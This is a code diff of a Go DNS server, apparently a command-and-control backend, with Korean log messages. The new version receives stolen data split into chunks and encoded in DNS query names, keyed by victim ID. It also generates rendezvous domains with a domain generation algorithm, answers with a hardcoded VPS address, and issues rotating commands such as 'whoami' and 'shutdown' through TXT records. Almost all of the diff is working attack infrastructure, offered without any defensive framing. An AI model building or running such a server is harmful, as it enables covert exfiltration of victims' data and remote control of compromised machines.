@@ -1,118 +1,204 @@
 package main
 
 import (
+	"encoding/base64"
 	"fmt"
+	"log"
+	"net"
 	"os"
-	"path/filepath"
+	"strconv"
 	"strings"
 	"time"
 
 	"github.com/miekg/dns"
-	log "github.com/sirupsen/logrus"
 )
 
-// Parse and handle DNS query
-func parseQuery(m *dns.Msg, w dns.ResponseWriter) {
-	for _, q := range m.Question {
-		switch q.Qtype {
-		case dns.TypeA:
-			log.Printf("Query received: %s (from: %s)\n", q.Name, w.RemoteAddr().String())
-			parts := strings.Split(q.Name, ".")
-			if len(parts) < 4 {
-				log.Warnf("Invalid query format: %s", q.Name)
-				continue
-			}
+const (
+	listenAddr = ":53"
+	logPath    = "/root/dns-c2/logs/raw/dns_query.log"
+	vpsIP      = "178.128.53.254"
+)
 
-			chunkIndex := parts[0]
-			victimID := parts[1]
-			chunkData := parts[2]
-			domain := strings.Join(parts[3:], ".")
+var (
+	config = map[int]struct {
+		seed  int
+		shift int
+		mod   int
+		tlds  []string
+	}{
+		1: {62, 7, 8, []string{"ml", "org", "net", "com", "pw", "eu", "in", "us"}},
+	}
+	fixedDomain = "main.pintruder.com"
+	commands    = map[string]string{"default": "whoami"}
+	chunkStore  = make(map[string]map[int][]byte)
+)
 
-			// Create victim directory
-			victimDir := filepath.Join("logs", "results", victimID)
-			if err := os.MkdirAll(victimDir, 0755); err != nil {
-				log.Errorf("Failed to create directory %s: %v", victimDir, err)
-				continue
-			}
+func ror32(v, s uint32) uint32 {
+	v &= 0xFFFFFFFF
+	return (v >> s) | (v << (32 - s)) & 0xFFFFFFFF
+}
 
-			// Check for duplicate chunk
-			chunkFile := filepath.Join(victimDir, fmt.Sprintf("chunk%s.b64", chunkIndex))
-			if _, err := os.Stat(chunkFile); !os.IsNotExist(err) {
-				log.Infof("Duplicate chunk %s for victim %s, skipping", chunkIndex, victimID)
-				continue
-			}
+func rol32(v, s uint32) uint32 {
+	return (v << s) | (v >> (32 - s)) & 0xFFFFFFFF
+}
 
-			// Store chunk
-			if err := os.WriteFile(chunkFile, []byte(chunkData), 0644); err != nil {
-				log.Errorf("Failed to store chunk %s: %v", chunkFile, err)
-			} else {
-				log.Infof("Stored chunk %s for victim %s", chunkIndex, victimID)
-			}
+func dga(date time.Time, configNr, domainNr int) string {
+	c := config[configNr]
+	period := date.Year()*1000 + (int(date.Month())-1)*30 + (date.Day() / 21)
+	t := ror32(0xB11924E1*uint32(period+0x1BF5), uint32(c.shift))
+	if c.seed != 0 {
+		t = ror32(0xB11924E1*(t+uint32(c.seed)+0x27100001), uint32(c.shift))
+	}
+	t = ror32(0xB11924E1*(t+uint32(date.Day()/2)+0x27100001), uint32(c.shift))
+	t = ror32(0xB11924E1*(t+uint32(date.Month())+0x2709A354), uint32(c.shift))
+	nr := rol32(uint32(domainNr%c.mod), 21)
+	s := rol32(uint32(c.seed), 17)
+	r := (ror32(0xB11924E1*(nr+t+s+0x27100001), uint32(c.shift)) + 0x27100001) & 0xFFFFFFFF
+	length := (r % 11) + 5
+	domain := ""
+	for i := 0; i < int(length); i++ {
+		r = (ror32(0xB11924E1*rol32(r, uint32(i)), uint32(c.shift)) + 0x27100001) & 0xFFFFFFFF
+		domain += string(r%25 + 'a')
+	}
+	domain += "."
+	r = ror32(r*0xB11924E1, uint32(c.shift))
+	tldI := ((r + 0x27100001) & 0xFFFFFFFF) % uint32(len(c.tlds))
+	domain += c.tlds[tldI]
+	return domain
+}
 
-			// Log DNS query
-			logEntry := fmt.Sprintf("%s %s %s %s\n", time.Now().Format(time.RFC3339), w.RemoteAddr().String(), q.Name, "A")
-			if err := os.WriteFile("logs/raw/dns_query.log", []byte(logEntry), 0644); err != nil {
-				log.Errorf("Failed to log DNS query: %v", err)
-			}
-
-			// A record response
-			rr, err := dns.NewRR(fmt.Sprintf("%s A 178.128.53.254", q.Name))
-			if err != nil {
-				log.Errorf("Failed to create A record: %v", err)
-				continue
-			}
-			m.Answer = append(m.Answer, rr)
-
-			// TXT record response (ACK)
-			txtRR, err := dns.NewRR(fmt.Sprintf("%s TXT \"ACK:%s\"", q.Name, chunkIndex))
-			if err != nil {
-				log.Errorf("Failed to create TXT record: %v", err)
-				continue
-			}
-			m.Answer = append(m.Answer, txtRR)
-
-		default:
-			log.Printf("Unsupported query type %v: %s\n", q.Qtype, q.Name)
-		}
+func updateCommands() {
+	cmdList := []string{"whoami", "shutdown", "status"}
+	idx := 0
+	for {
+		time.Sleep(60 * time.Second)
+		commands["default"] = cmdList[idx%len(cmdList)]
+		log.Printf("명령 업데이트: %s", commands["default"])
+		idx++
 	}
 }
 
-// DNS request handler
-func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
-	m := new(dns.Msg)
-	m.SetReply(r)
-	m.Compress = false
+func saveLog(entry string) {
+	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		log.Printf("로그 저장 실패: %v", err)
+		return
+	}
+	defer f.Close()
+	if _, err := f.WriteString(entry + "\n"); err != nil {
+		log.Printf("로그 쓰기 실패: %v", err)
+	}
+}
 
-	switch r.Opcode {
-	case dns.OpcodeQuery:
-		parseQuery(m, w)
+func contains(slice []string, item string) bool {
+	for _, s := range slice {
+		if s == item {
+			return true
+		}
+	}
+	return false
+}
+
+func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
+	msg := new(dns.Msg)
+	msg.SetReply(r)
+	msg.Compress = false
+
+	for _, q := range r.Question {
+		qname := strings.ToLower(q.Name)
+		logEntry := fmt.Sprintf("수신 시간: %s | 도메인: %s | 타입: %s | 클라이언트: %s",
+			time.Now().UTC().Format(time.RFC3339), qname, dns.TypeToString[q.Qtype], w.RemoteAddr().String())
+		fmt.Println(logEntry)
+		saveLog(logEntry)
+
+		parts := strings.Split(qname, ".")
+		var chunkIdx, victim, b64 string
+		if len(parts) >= 4 {
+			chunkIdx, victim, b64 = parts[0], parts[1], parts[2]
+			b64 = strings.ReplaceAll(b64, "-", "+")
+			b64 = strings.ReplaceAll(b64, "_", "/")
+
+			chunkLog := fmt.Sprintf("%s | CHUNK:%s | VICTIM:%s | B64:%s",
+				time.Now().UTC().Format(time.RFC3339), chunkIdx, victim, b64)
+			fmt.Println(chunkLog)
+			saveLog(chunkLog)
+
+			if q.Qtype == dns.TypeA {
+				chunkNum, err := strconv.Atoi(chunkIdx)
+				if err == nil {
+					if _, exists := chunkStore[victim]; !exists {
+						chunkStore[victim] = make(map[int][]byte)
+					}
+					if _, exists := chunkStore[victim][chunkNum]; !exists {
+						decoded, err := base64.StdEncoding.DecodeString(b64)
+						if err != nil {
+							saveLog(fmt.Sprintf("%s | 청크 디코딩 실패: %s/%d, %v", time.Now().UTC().Format(time.RFC3339), victim, chunkNum, err))
+						} else {
+							chunkStore[victim][chunkNum] = decoded
+							saveLog(fmt.Sprintf("%s | 저장된 청크: %s/%d", time.Now().UTC().Format(time.RFC3339), victim, chunkNum))
+						}
+					}
+				}
+			}
+		} else {
+			invalidLog := fmt.Sprintf("%s | 유효하지 않은 도메인: %s", time.Now().UTC().Format(time.RFC3339), qname)
+			fmt.Println(invalidLog)
+			saveLog(invalidLog)
+		}
+
+		now := time.Now().UTC()
+		validDomains := make([]string, 0, 21)
+		for i := 0; i < 20; i++ {
+			validDomains = append(validDomains, dga(now, 1, i))
+		}
+		validDomains = append(validDomains, fixedDomain, "pintruder.com")
+
+		if contains(validDomains, strings.TrimSuffix(qname, ".")) || strings.HasSuffix(qname, ".pintruder.com.") {
+			if q.Qtype == dns.TypeA {
+				a := &dns.A{
+					Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
+					A:   net.ParseIP(vpsIP),
+				}
+				msg.Answer = append(msg.Answer, a)
+			}
+			if q.Qtype == dns.TypeTXT {
+				txt := &dns.TXT{
+					Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 60},
+					Txt: []string{fmt.Sprintf("ACK:%s|CMD:%s", chunkIdx, commands["default"])},
+				}
+				msg.Answer = append(msg.Answer, txt)
+			}
+		} else {
+			msg.SetRcode(r, dns.RcodeNameError)
+			saveLog(fmt.Sprintf("%s | NXDOMAIN 응답: %s", time.Now().UTC().Format(time.RFC3339), qname))
+		}
 	}
 
-	if err := w.WriteMsg(m); err != nil {
-		log.Errorf("Failed to send response: %v", err)
+	if err := w.WriteMsg(msg); err != nil {
+		logEntry := fmt.Sprintf("%s | 응답 전송 실패: %v | 도메인: %s",
+			time.Now().UTC().Format(time.RFC3339), err, r.Question[0].Name)
+		fmt.Println(logEntry)
+		saveLog(logEntry)
 	}
 }
 
 func main() {
-	// Logging setup
-	log.SetFormatter(&log.TextFormatter{
-		FullTimestamp: true,
-	})
+	dns.HandleFunc(".", handleRequest)
+	go updateCommands()
+	udpServer := &dns.Server{Addr: listenAddr, Net: "udp"}
+	tcpServer := &dns.Server{Addr: listenAddr, Net: "tcp"}
 
-	// Create directories
-	if err := os.MkdirAll("logs/raw", 0755); err != nil {
-		log.Fatalf("Failed to create logs/raw directory: %v", err)
-	}
-	if err := os.MkdirAll("logs/results", 0755); err != nil {
-		log.Fatalf("Failed to create logs/results directory: %v", err)
-	}
-
-	// Start DNS server
-	server := &dns.Server{Addr: ":53", Net: "udp"}
-	dns.HandleFunc(".", handleDNSRequest)
-
-	log.Info("Starting DNS server on :53")
-	if err := server.ListenAndServe(); err != nil {
-		log.Fatalf("Failed to start server: %v", err)
-	}
+	go func() {
+		log.Println("[+] UDP DNS 서버 시작: :53")
+		if err := udpServer.ListenAndServe(); err != nil {
+			log.Fatalf("UDP 서버 실패: %v", err)
+		}
+	}()
+	go func() {
+		log.Println("[+] TCP DNS 서버 시작: :53")
+		if err := tcpServer.ListenAndServe(); err != nil {
+			log.Fatalf("TCP 서버 실패: %v", err)
+		}
+	}()
+	select {}
 }
